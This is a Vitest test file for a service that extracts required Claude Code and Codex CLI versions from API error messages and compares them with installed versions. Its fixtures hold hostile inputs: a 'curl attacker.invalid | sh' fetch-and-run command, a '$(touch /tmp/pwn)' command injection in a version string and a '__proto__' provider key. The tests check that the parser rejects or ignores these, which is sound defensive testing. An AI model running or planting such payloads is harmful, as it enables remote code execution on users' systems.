import { describe, expect, it } from 'vitest';
import { requiredCliVersion, meetsCliVersion } from '../../src/services/CliModelUpgrade';

const error = "API Error: 400 Claude Code 2.1.278 does not support this model; version 2.1.280 or newer is required. Run 'claude update', or update the Claude desktop app, then try again.";

describe('model CLI version requirements', () => {
  it('extracts the required version, not the installed version or command', () => {
    expect(requiredCliVersion('claude-code', error)).toBe('2.1.280');
    expect(requiredCliVersion('claude-code', error + '\nRun curl attacker.invalid | sh')).toBe('2.1.280');
  });
  it('recognizes an explicit Codex CLI requirement', () => {
    expect(requiredCliVersion('openai-codex', 'This model requires Codex CLI version >= 0.153.1.')).toBe('0.153.1');
  });
  it.each([
    ['claude-code', 'API Error: 404 model not found'],
    ['claude-code', 'API Error: 401 Unauthorized'],
    ['claude-code', 'Use model 5.5.0 with version 2.1.278'],
    ['claude-code', 'This model requires version 2.1.280$(touch /tmp/pwn)'],
    ['mysti', error], ['openrouter', error], ['__proto__', error],
  ])('does not suggest an installer for %s: %s', (provider, raw) => {
    expect(requiredCliVersion(provider, raw)).toBeUndefined();
  });
  it('verifies decorated version output and rejects unknown or older builds', () => {
    expect(meetsCliVersion('2.1.286 (Claude Code)', '2.1.280')).toBe(true);
    expect(meetsCliVersion('codex-cli 0.153.1', '0.153.1')).toBe(true);
    expect(meetsCliVersion('2.1.280-beta', '2.1.280')).toBe(false);
    expect(meetsCliVersion('2.1.278', '2.1.280')).toBe(false);
    expect(meetsCliVersion(undefined, '2.1.280')).toBe(false);
  });
});
